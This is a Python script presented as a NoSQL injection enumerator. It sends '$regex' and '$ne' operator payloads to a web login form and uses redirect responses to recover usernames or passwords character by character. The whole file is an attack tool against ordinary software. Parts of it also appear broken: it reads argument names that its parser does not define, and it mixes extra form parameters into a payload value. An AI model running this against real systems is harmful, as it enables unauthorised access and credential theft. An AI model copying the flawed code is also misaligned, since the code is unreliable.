#!/usr/bin/python3
import string
import requests
import argparse
import sys
from colorama import Fore
from urllib3.util import Retry
from requests.adapters import HTTPAdapter

def get_arguments():
    parser = argparse.ArgumentParser(description="NoSQL Injection User and Password Enumerator")
    parser.add_argument("-u", required=True, metavar="URL", help="Form submission url. Eg: http://example.com/index.php")
    parser.add_argument("-up", required=True, metavar="parameter", help="Parameter name of the username. Eg: username, user")
    parser.add_argument("-pp", required=True, metavar="parameter", help="Parameter name of the password. Eg: password, pass")
    parser.add_argument("-op", metavar="parameters", help="Other parameters with the values. Separate each parameter with a comma(,). Eg: login:Login, submit:Submit")
    parser.add_argument("-ep", required=True, metavar="parameter", help="Parameter that need to enumerate. Eg: username, password")
    parser.add_argument("-m", metavar="Method", help="Method of the form. Eg: GET/POST")
    return parser.parse_args()

def print_help_and_exit(parser):
    print(parser.print_help(sys.stderr))
    print(Fore.YELLOW + "\nExample: python " + sys.argv[0] + " -u http://example.com/index.php -up username -pp password -ep username -op login:login,submit:submit -m POST")
    sys.exit(1)

def get_method(args):
    # Updated method to handle the -m argument correctly
    if args.m:
        method = args.m.upper()  # Convert to uppercase to ensure valid HTTP method
        if method not in ['GET', 'POST']:
            print(Fore.RED + "Invalid method. Only 'GET' and 'POST' are supported.")
            sys.exit(1)
    else:
        method = 'POST'  # Default to POST if -m argument is not provided
    return method

def build_payloads(characters):
    return [firstChar + char for firstChar in characters for char in characters]

def main():
    args = get_arguments()
    method = get_method(args)
    if len(sys.argv) == 1:
        print_help_and_exit(args)

    url = args.url
    username_parameter = args.username_parameter
    password_parameter = args.password_parameter
    enum_parameter = args.enum_parameter
    method = get_method(args)
    other_parameters = "," + args.other_parameters if args.other_parameters else ""

    # Remove special characters from the list of printable characters
    characters = ''.join(c for c in string.printable if c not in "$^&*|.+\?")

    loop = True
    final_output = []
    count = 0

    payloads = build_payloads(characters)

    # Create a Retry object with backoff factor and maximum retries
    retry = Retry(total=5, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])

    # Create a session and attach the Retry object to it
    session = requests.Session()
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)

    for payload in payloads:
        para = {enum_parameter + '[$regex]': "^" + payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}

        try:
            r = session.request(method=method, url=url, data=para, allow_redirects=False, timeout=10)  # Fixed the method argument
            r.raise_for_status()

            if r.status_code == 302:
                loop = True
                print(Fore.GREEN + f"Pattern found that starts with '{payload[0]}'")
                userpass = payload
                while loop:
                    loop = False
                    for char in characters:
                        new_payload = userpass + char
                        para = {enum_parameter + '[$regex]': "^" + new_payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}

                        try:
                            r = session.request(method=method, url=url, data=para, timeout=10)  # Fixed the method argument
                            r.raise_for_status()

                            if r.status_code == 302:
                                print(Fore.YELLOW + f"Pattern found: {new_payload}")
                                userpass = new_payload
                                loop = True

                        except requests.exceptions.RequestException as e:
                            print(Fore.RED + "Error occurred during request:", e)
                            break

                print(Fore.GREEN + f"{enum_parameter} found: {userpass}")
                final_output.append(userpass)
                count += 1

        except requests.exceptions.RequestException as e:
            print(Fore.RED + "Error occurred during request:", e)

    if count == 0:
        print(Fore.RED + f"No {enum_parameter} found")
    else:
        print(f"\n{count} {enum_parameter}(s) found:")
        print(Fore.RED + "\n".join(final_output))

if __name__ == "__main__":
    main()
